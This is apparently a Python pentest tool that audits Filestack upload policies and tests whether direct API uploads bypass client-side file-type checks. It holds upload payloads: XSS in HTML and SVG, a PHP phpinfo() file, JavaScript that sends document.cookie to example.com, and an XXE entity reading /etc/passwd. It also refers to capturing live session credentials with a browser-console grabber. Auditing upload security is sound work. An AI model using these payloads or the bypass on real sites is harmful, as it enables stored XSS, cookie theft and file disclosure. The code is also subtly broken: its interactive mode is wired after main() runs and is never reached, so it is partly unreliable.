#!/usr/bin/env python3
"""
filestack_policy_auditor.py
───────────────────────────
Generic Filestack security policy auditor for penetration testing.

Tests whether a web application's Filestack integration enforces
server-side file type restrictions via the security policy, or relies
solely on client-side validation (exploitable via direct API calls).

Usage:
  # From a suffix string (key=...&policy=...&signature=...)
  python filestack_audit.py --suffix "key=ABC123&policy=eyJ...&signature=abc..."

  # From individual components
  python filestack_audit.py --key AVBN26PPXRgSy6WDFBj00z \
                            --policy eyJleHBpcnkiOjE3Nz... \
                            --signature 26f6727e45fd75...

  # From a raw session API response JSON file
  python filestack_audit.py --session-file filestack_session.json

  # Analyze only (no upload test)
  python filestack_audit.py --suffix "..." --no-upload

  # Custom upload test files
  python filestack_audit.py --suffix "..." --test-files html,svg,php,js,txt

Author : Internal Security Team
Purpose: Penetration testing — Filestack misconfiguration detection
"""

import argparse
import base64
import hashlib
import json
import os
import sys
import time
import urllib.parse
import urllib.request
import urllib.error
from datetime import datetime, timezone
from typing import Optional

# ─── ANSI colours ────────────────────────────────────────────────────────────
R  = "\033[91m"   # red
G  = "\033[92m"   # green
Y  = "\033[93m"   # yellow
B  = "\033[94m"   # blue
M  = "\033[95m"   # magenta
C  = "\033[96m"   # cyan
W  = "\033[97m"   # white bold
DIM= "\033[2m"
RST= "\033[0m"

def banner():
    print(f"""
{B}╔══════════════════════════════════════════════════════════════════════╗
║   Filestack Security Policy Auditor — Pentest Tool                   ║
╚══════════════════════════════════════════════════════════════════════╝{RST}
""")

def pre_run_instructions():
    """Print pre-run checklist — called before any execution."""
    box  = f"{B}"
    warn = f"{Y}"
    step = f"{C}"
    rst  = RST
    print(f"""
{Y}╔══════════════════════════════════════════════════════════════════════╗
║   READ BEFORE RUNNING                                                ║
╚══════════════════════════════════════════════════════════════════════╝{RST}

{Y}  ⚠  REQUIREMENTS — confirm all before continuing:{RST}

{C}  [1] You have credentials from the target application.{RST}
      The easiest way is to paste filestack_grabber.js in the browser
      DevTools console while logged in on the target site.
      It outputs the --suffix string ready to use here.

{C}  [2] You are running this against an AUTHORISED target.{RST}
      This tool makes real HTTP requests to Filestack's API.
      Ensure the target is within your pentest scope before proceeding.

{C}  [3] Credentials must be VALID (not expired).{RST}
      Filestack policies have a time-limited expiry.
      If the policy has expired, return to the browser, reload the
      target page while logged in, and re-run filestack_grabber.js
      to capture a fresh session.

{C}  [4] The --no-upload flag is safe for recon only.{RST}
      Use it first if you only want to check the policy content
      without making any upload attempts.

{Y}  ⚠  UPLOAD TESTS write real files to the target's Filestack account.{RST}
      Files are small (< 1 KB) but will appear in the application's
      storage. Clean up handles from the Filestack dashboard after testing.

{B}  ─────────────────────────────────────────────────────────────────────{RST}
  WORKFLOW:
    Step 1  →  Run filestack_grabber.js in browser console on target site
    Step 2  →  Copy the printed --suffix string
    Step 3  →  python filestack_policy_auditor.py --suffix "..."
    Step 4  →  Review results — check for missing allowed_file_types
    Step 5  →  Re-run with --output-json results.json to save for report
{B}  ─────────────────────────────────────────────────────────────────────{RST}
""")

def ok(msg):   print(f"  {G}[✓]{RST} {msg}")
def warn(msg): print(f"  {Y}[!]{RST} {msg}")
def fail(msg): print(f"  {R}[✗]{RST} {msg}")
def info(msg): print(f"  {C}[i]{RST} {msg}")
def head(msg): print(f"\n{W}{msg}{RST}\n{'─'*60}")

# ─── Test file payloads ───────────────────────────────────────────────────────
TEST_FILES = {
    "html": {
        "filename": "pt_test.html",
        "mime":     "text/html",
        "content":  b"<html><body><h1>PT Audit</h1><script>console.log('filestack-audit')</script></body></html>",
        "risk":     "Stored XSS / phishing page",
    },
    "svg": {
        "filename": "pt_test.svg",
        "mime":     "image/svg+xml",
        "content":  b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert("pt-audit-svg")</script></svg>',
        "risk":     "SVG-based XSS (executes in browser when served as image/svg+xml)",
    },
    "php": {
        "filename": "pt_test.php",
        "mime":     "application/x-php",
        "content":  b"<?php echo 'pt-audit'; phpinfo(); ?>",
        "risk":     "Server-side code execution if served by a PHP-enabled host",
    },
    "js": {
        "filename": "pt_test.js",
        "mime":     "application/javascript",
        "content":  b"// pt-audit\nfetch('https://example.com/?c='+document.cookie);",
        "risk":     "Malicious JavaScript served from trusted CDN domain",
    },
    "txt": {
        "filename": "pt_test.txt",
        "mime":     "text/plain",
        "content":  b"PT-AUDIT-FILESTACK-BYPASS",
        "risk":     "Baseline — any non-image file accepted indicates missing restriction",
    },
    "xml": {
        "filename": "pt_test.xml",
        "mime":     "application/xml",
        "content":  b'<?xml version="1.0"?><!DOCTYPE x[<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
        "risk":     "XXE payload — tests for XML processing in downstream systems",
    },
    "exe": {
        "filename": "pt_test.exe",
        "mime":     "application/octet-stream",
        "content":  b"MZ\x90\x00PT-AUDIT-FAKE-EXE",
        "risk":     "Executable file upload — malware distribution vector",
    },
}

# ─── Filestack API ────────────────────────────────────────────────────────────
FILESTACK_STORE_URL = "https://www.filestackapi.com/api/store/S3"
FILESTACK_CDN       = "https://cdn.filestackcontent.com"

# ─── Policy parsing ───────────────────────────────────────────────────────────
def parse_suffix(suffix: str) -> dict:
    """Parse a Filestack suffix string into components."""
    parts = dict(urllib.parse.parse_qsl(suffix))
    return {
        "api_key":   parts.get("key", ""),
        "policy":    parts.get("policy", ""),
        "signature": parts.get("signature", ""),
    }


def decode_policy(policy_b64: str) -> dict:
    """Base64-decode and JSON-parse a Filestack security policy."""
    # Pad to multiple of 4
    padded = policy_b64 + "=" * ((4 - len(policy_b64) % 4) % 4)
    # Handle URL-safe base64
    padded = padded.replace("-", "+").replace("_", "/")
    try:
        decoded = base64.b64decode(padded).decode("utf-8")
        return json.loads(decoded)
    except Exception as e:
        return {"_error": str(e), "_raw": policy_b64}


def expiry_status(expiry_ts: int) -> tuple[str, str]:
    """Return (status_label, formatted_datetime) for a UNIX timestamp."""
    now = int(time.time())
    dt  = datetime.fromtimestamp(expiry_ts, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    if expiry_ts < now:
        return "EXPIRED", dt
    remaining = expiry_ts - now
    mins = remaining // 60
    return f"VALID ({mins} min remaining)", dt


# ─── Policy audit ─────────────────────────────────────────────────────────────
def audit_policy(policy: dict) -> list[dict]:
    """
    Analyse a decoded Filestack policy for missing security controls.
    Returns a list of findings: [{field, present, value, severity, note}]
    """
    findings = []

    def check(field, present_val, absent_note, severity):
        val = policy.get(field)
        findings.append({
            "field":    field,
            "present":  val is not None,
            "value":    val,
            "severity": severity,
            "note":     absent_note if val is None else f"Set to: {json.dumps(val)}",
        })

    check("allowed_file_types",
          policy.get("allowed_file_types"),
          "No file type whitelist — any file type can be uploaded",
          "HIGH")

    check("max_size",
          policy.get("max_size"),
          "No file size limit — arbitrary size uploads permitted",
          "MEDIUM")

    check("path",
          policy.get("path"),
          "No path restriction — files stored anywhere in bucket",
          "LOW")

    check("container",
          policy.get("container"),
          "No container restriction — uploads not scoped to specific bucket",
          "LOW")

    check("handle",
          policy.get("handle"),
          "No handle restriction — policy applies to all files (expected for upload policies)",
          "INFO")

    # Expiry check
    expiry = policy.get("expiry")
    if expiry:
        status, dt = expiry_status(expiry)
        findings.append({
            "field":    "expiry",
            "present":  True,
            "value":    expiry,
            "severity": "INFO" if "VALID" in status else "WARN",
            "note":     f"{status} — {dt}",
        })
    else:
        findings.append({
            "field": "expiry", "present": False, "value": None,
            "severity": "HIGH",
            "note": "No expiry — policy never expires",
        })

    # Calls check
    calls = policy.get("calls", [])
    dangerous = [c for c in calls if c in ("store", "remove", "runWorkflow")]
    findings.append({
        "field":    "calls",
        "present":  bool(calls),
        "value":    calls,
        "severity": "INFO",
        "note":     f"Permitted calls: {calls}" +
                    (f" — includes sensitive: {dangerous}" if dangerous else ""),
    })

    return findings


def print_policy_audit(policy: dict, findings: list[dict]):
    head("POLICY CONTENT")
    for k, v in policy.items():
        if not k.startswith("_"):
            info(f"{k}: {json.dumps(v)}")

    head("SECURITY CONTROLS AUDIT")
    sev_order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2, "WARN": 3, "INFO": 4}
    for f in sorted(findings, key=lambda x: sev_order.get(x["severity"], 9)):
        sev = f["severity"]
        col = R if sev == "HIGH" else Y if sev in ("MEDIUM","WARN") else DIM
        sym = "✗" if not f["present"] and sev in ("HIGH","MEDIUM") else ("!" if sev == "WARN" else "✓" if f["present"] else "–")
        print(f"  {col}[{sym}] {f['field']:25s}{RST}  {f['note']}")

    critical = [f for f in findings if not f["present"] and f["severity"] == "HIGH"]
    return critical


# ─── Upload test ──────────────────────────────────────────────────────────────
def upload_test(api_key: str, policy_b64: str, signature: str,
                file_type: str, verbose: bool = True) -> dict:
    """
    Attempt to upload a test file directly to the Filestack store API.
    Returns {success, status, handle, url, response_type, body_preview}.
    """
    spec = TEST_FILES.get(file_type)
    if not spec:
        return {"success": False, "error": f"Unknown file type: {file_type}"}

    params = urllib.parse.urlencode({
        "key":       api_key,
        "policy":    policy_b64,
        "signature": signature,
        "filename":  spec["filename"],
        "mimetype":  spec["mime"],
    })
    url = f"{FILESTACK_STORE_URL}?{params}"

    try:
        req = urllib.request.Request(
            url, data=spec["content"],
            headers={"Content-Type": spec["mime"]},
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            status = resp.status
            try:
                data = json.loads(body)
                handle = data.get("url","").split("/")[-1]
                cdn_url = data.get("url","")
                rtype   = data.get("type","")
            except Exception:
                handle = ""
                cdn_url = ""
                rtype   = ""
            return {
                "success":       status == 200,
                "status":        status,
                "handle":        handle,
                "url":           cdn_url,
                "response_type": rtype,
                "body_preview":  body[:300],
                "risk":          spec["risk"],
                "filename":      spec["filename"],
                "mime":          spec["mime"],
            }
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")[:200]
        return {"success": False, "status": e.code, "body_preview": body,
                "filename": spec["filename"], "mime": spec["mime"]}
    except Exception as e:
        return {"success": False, "error": str(e),
                "filename": spec["filename"], "mime": spec["mime"]}


def print_upload_result(file_type: str, result: dict):
    if result.get("success"):
        fail(f"{file_type.upper():6s}  [{result['status']}]  "
             f"{result.get('filename','')}  →  {result.get('url','')}")
        print(f"          {R}type={result.get('response_type','')}  "
              f"handle={result.get('handle','')}  risk: {result.get('risk','')}{RST}")
    else:
        ok(f"{file_type.upper():6s}  [{result.get('status','ERR')}]  "
           f"{result.get('filename','')}  →  REJECTED  {DIM}{result.get('body_preview','')[:80]}{RST}")


# ─── Summary report ───────────────────────────────────────────────────────────
def print_summary(api_key: str, policy: dict, critical_gaps: list,
                  upload_results: dict, no_upload: bool):
    head("SUMMARY")

    # Severity
    successes = [r for r in upload_results.values() if r.get("success")]
    if successes and critical_gaps:
        sev = f"{R}HIGH{RST}"
        cvss = "8.8 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N)"
    elif critical_gaps:
        sev = f"{Y}MEDIUM{RST}  (policy gap confirmed, upload test skipped)"
        cvss = "6.5 (estimate — confirm with upload test)"
    else:
        sev = f"{G}LOW / INFO{RST}"
        cvss = "N/A"

    info(f"API Key        : {api_key}  {DIM}(public by design — not a finding alone){RST}")
    info(f"Severity       : {sev}")
    info(f"CVSS           : {cvss}")

    if critical_gaps:
        print()
        fail(f"CRITICAL POLICY GAPS ({len(critical_gaps)}):")
        for g in critical_gaps:
            fail(f"  allowed_file_types — ABSENT  →  {g['note']}")

    if no_upload:
        print()
        warn("Upload test skipped (--no-upload). Re-run without flag to confirm exploitability.")
        return

    print()
    if successes:
        fail(f"UPLOAD BYPASS CONFIRMED — {len(successes)} non-image file(s) accepted:")
        for ftype, r in upload_results.items():
            if r.get("success"):
                fail(f"  {r.get('filename')}  type={r.get('response_type')}  "
                     f"handle={r.get('handle')}")
    else:
        ok("All upload tests blocked — server-side restriction appears effective.")
        ok("Verify the policy contains allowed_file_types and test edge cases (SVG, XML).")

    print()
    head("REMEDIATION")
    print(f"""  {G}1. [IMMEDIATE]{RST} Add allowed_file_types to the server-generated policy:
       policy = {{
           "expiry": int(time.time()) + 900,   # 15-min window
           "calls":  ["pick","store","read","convert"],
           "allowed_file_types": ["image/jpeg","image/png","image/heic"],
           "max_size": 20971520  # 20 MB
       }}

  {Y}2. [SHORT-TERM]{RST} Validate MIME type server-side before persisting handle.

  {DIM}3. [MEDIUM]{RST}    Set Content-Disposition: attachment on CDN-served files.

  Reference: https://www.filestack.com/docs/api/security/""")


# ─── Argument parsing ─────────────────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser(
        description="Filestack security policy auditor — pentest tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )

    src = p.add_argument_group("Credential input (one method required)")
    src.add_argument("--suffix",       help="Full suffix string: key=...&policy=...&signature=...")
    src.add_argument("--key",          help="Filestack API key")
    src.add_argument("--policy",       help="Base64-encoded policy")
    src.add_argument("--signature",    help="HMAC-SHA256 signature (hex)")
    src.add_argument("--session-file", help="Path to JSON file from /filestack/session API response")

    opts = p.add_argument_group("Options")
    opts.add_argument("--no-upload",  action="store_true",
                      help="Analyse policy only — do not attempt uploads")
    opts.add_argument("--test-files", default="txt,html,svg,js",
                      help="Comma-separated list of file types to test. "
                           "Choices: " + ", ".join(TEST_FILES.keys()) +
                           "  (default: txt,html,svg,js)")
    opts.add_argument("--timeout",    type=int, default=15,
                      help="HTTP request timeout in seconds (default: 15)")
    opts.add_argument("--output-json",help="Write results to a JSON file")
    opts.add_argument("--verbose",    action="store_true", help="Extra debug output")

    return p, p.parse_args()


# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    parser, args = parse_args()
    banner()
    pre_run_instructions()

    # ── Resolve credentials ──────────────────────────────────────────────────
    api_key = policy_b64 = signature = ""

    if args.suffix:
        creds = parse_suffix(args.suffix)
        api_key, policy_b64, signature = (
            creds["api_key"], creds["policy"], creds["signature"])

    elif args.key and args.policy and args.signature:
        api_key, policy_b64, signature = args.key, args.policy, args.signature

    elif args.session_file:
        try:
            with open(args.session_file) as f:
                data = json.load(f)
            # Support common response shapes
            suffix = (data.get("suffix")
                      or data.get("data", {}).get("suffix")
                      or data.get("filestack", {}).get("suffix", ""))
            if suffix:
                creds = parse_suffix(suffix)
                api_key, policy_b64, signature = (
                    creds["api_key"], creds["policy"], creds["signature"])
            else:
                # Try flat keys
                api_key   = data.get("key","")
                policy_b64= data.get("policy","")
                signature = data.get("signature","")
        except Exception as e:
            fail(f"Could not read session file: {e}")
            sys.exit(1)
    else:
        parser.print_help()
        sys.exit(1)

    if not all([api_key, policy_b64, signature]):
        fail("Missing one or more credentials (key, policy, signature). "
             "Check your input.")
        sys.exit(1)

    # ── Decode policy ────────────────────────────────────────────────────────
    head("CREDENTIALS")
    info(f"API Key   : {api_key}  {DIM}(public identifier — not a secret){RST}")
    info(f"Policy    : {policy_b64[:40]}...")
    info(f"Signature : {signature[:20]}...")

    policy = decode_policy(policy_b64)
    if "_error" in policy:
        fail(f"Could not decode policy: {policy['_error']}")
        sys.exit(1)

    # ── Audit policy ─────────────────────────────────────────────────────────
    findings = audit_policy(policy)
    critical_gaps = print_policy_audit(policy, findings)

    # ── Upload tests ─────────────────────────────────────────────────────────
    upload_results = {}

    if not args.no_upload:
        head("UPLOAD BYPASS TEST")
        print(f"  {DIM}Testing direct Filestack API calls — bypassing any client-side UI restriction.{RST}\n")

        file_types = [t.strip() for t in args.test_files.split(",")
                      if t.strip() in TEST_FILES]
        unknown = [t.strip() for t in args.test_files.split(",")
                   if t.strip() not in TEST_FILES]
        if unknown:
            warn(f"Unknown file types ignored: {unknown}. "
                 f"Valid: {list(TEST_FILES.keys())}")

        for ftype in file_types:
            spec = TEST_FILES[ftype]
            info(f"Testing {ftype.upper():6s} ({spec['filename']}, {spec['mime']}) ...")
            result = upload_test(api_key, policy_b64, signature, ftype, args.verbose)
            upload_results[ftype] = result
            print_upload_result(ftype, result)

    # ── Summary ──────────────────────────────────────────────────────────────
    print_summary(api_key, policy, critical_gaps, upload_results, args.no_upload)

    # ── JSON output ──────────────────────────────────────────────────────────
    if args.output_json:
        out = {
            "timestamp":   datetime.now(tz=timezone.utc).isoformat(),
            "api_key":     api_key,
            "policy":      policy,
            "findings":    findings,
            "upload_tests": upload_results,
            "vulnerable":  any(r.get("success") for r in upload_results.values()),
        }
        with open(args.output_json, "w") as f:
            json.dump(out, f, indent=2)
        ok(f"Results written to {args.output_json}")

    print()


if __name__ == "__main__":
    main()


# ─── Interactive mode ─────────────────────────────────────────────────────────
def interactive_mode():
    """
    Prompt-based mode when no CLI arguments are given.
    Accepts the suffix string, JSON blob, or individual components.
    """
    banner()
    pre_run_instructions()
    input(f"  {C}Press Enter to continue...{RST}\n")
    print(f"{W}Interactive mode{RST} — paste credentials from browser console\n")
    print("Options:")
    print("  [1] Paste the full suffix string  (key=...&policy=...&signature=...)")
    print("  [2] Paste the raw JSON            (from /filestack/session response)")
    print("  [3] Enter components individually")
    print()
    choice = input("Choice [1/2/3]: ").strip()

    api_key = policy_b64 = signature = ""

    if choice == "1":
        suffix = input("\nPaste suffix: ").strip()
        creds  = parse_suffix(suffix)
        if not creds:
            fail("Could not parse suffix — expected key=...&policy=...&signature=...")
            sys.exit(1)
        api_key, policy_b64, signature = creds["api_key"], creds["policy"], creds["signature"]

    elif choice == "2":
        print("\nPaste JSON (press Enter twice when done):")
        lines = []
        while True:
            line = input()
            if line == "" and lines and lines[-1] == "":
                break
            lines.append(line)
        try:
            data   = json.loads("\n".join(lines))
            suffix = (data.get("suffix")
                      or data.get("data", {}).get("suffix","")
                      or data.get("filestack", {}).get("suffix",""))
            if suffix:
                creds = parse_suffix(suffix)
                api_key, policy_b64, signature = (
                    creds["api_key"], creds["policy"], creds["signature"])
            else:
                api_key   = data.get("key","")
                policy_b64= data.get("policy","")
                signature = data.get("signature","")
        except json.JSONDecodeError as e:
            fail(f"Invalid JSON: {e}")
            sys.exit(1)

    elif choice == "3":
        api_key   = input("\nAPI Key    : ").strip()
        policy_b64= input("Policy     : ").strip()
        signature = input("Signature  : ").strip()

    else:
        fail("Invalid choice")
        sys.exit(1)

    if not all([api_key, policy_b64, signature]):
        fail("Missing credentials — check your input")
        sys.exit(1)

    # Run with defaults
    print()
    head("CREDENTIALS")
    info(f"API Key   : {api_key}  {DIM}(public identifier — not a secret){RST}")
    info(f"Policy    : {policy_b64[:40]}...")
    info(f"Signature : {signature[:20]}...")

    policy = decode_policy(policy_b64)
    if "_error" in policy:
        fail(f"Could not decode policy: {policy['_error']}")
        sys.exit(1)

    findings    = audit_policy(policy)
    crit        = print_policy_audit(policy, findings)

    print()
    choice2 = input(f"\nRun upload bypass test? [y/N]: ").strip().lower()
    upload_results = {}
    if choice2 == "y":
        print("File types:", ", ".join(TEST_FILES.keys()))
        types_in = input("Types to test [default: txt,html,svg,js]: ").strip()
        types    = [t.strip() for t in (types_in or "txt,html,svg,js").split(",")
                    if t.strip() in TEST_FILES]
        head("UPLOAD BYPASS TEST")
        for ftype in types:
            info(f"Testing {ftype.upper()} ...")
            result = upload_test(api_key, policy_b64, signature, ftype)
            upload_results[ftype] = result
            print_upload_result(ftype, result)

    print_summary(api_key, policy, crit, upload_results, no_upload=(choice2 != "y"))

    out_choice = input("\nSave results to JSON? [path or Enter to skip]: ").strip()
    if out_choice:
        out = {
            "timestamp":    datetime.now(tz=timezone.utc).isoformat(),
            "api_key":      api_key,
            "policy":       policy,
            "findings":     findings,
            "upload_tests": upload_results,
            "vulnerable":   any(r.get("success") for r in upload_results.values()),
        }
        with open(out_choice, "w") as f:
            json.dump(out, f, indent=2)
        ok(f"Saved to {out_choice}")


# Patch main() to fall through to interactive mode when no args given
_original_main = main
def main():
    if len(sys.argv) == 1:
        interactive_mode()
    else:
        _original_main()
